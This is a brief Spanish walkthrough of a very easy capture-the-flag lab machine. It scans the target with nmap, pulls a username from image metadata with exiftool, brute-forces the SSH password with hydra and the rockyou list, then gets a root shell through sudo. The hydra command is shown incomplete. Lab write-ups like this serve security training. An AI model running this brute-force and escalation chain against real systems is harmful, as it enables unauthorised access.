Maquina: BorazuwarahCTF
Autor: BorazuwarahCTF
Dificultad: Muy Facil

ping 172.17.0.2 -c 1
sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv 
Visitamos la pagina web 
https://172.17.0.2
nos descargamos la imagen
usamos la herramienta exiftool
sudo exiftool imagen.jpeg
encontramos el usuario
sudo hydra -l borazuwarah -P /usr/share/wordlist/rockyou.txt.gz
obtenemos la contraseña y entramos por ssh
ssh borazuwarah@172.17.0.2
sudo -l
sudo /bin/bash
whoami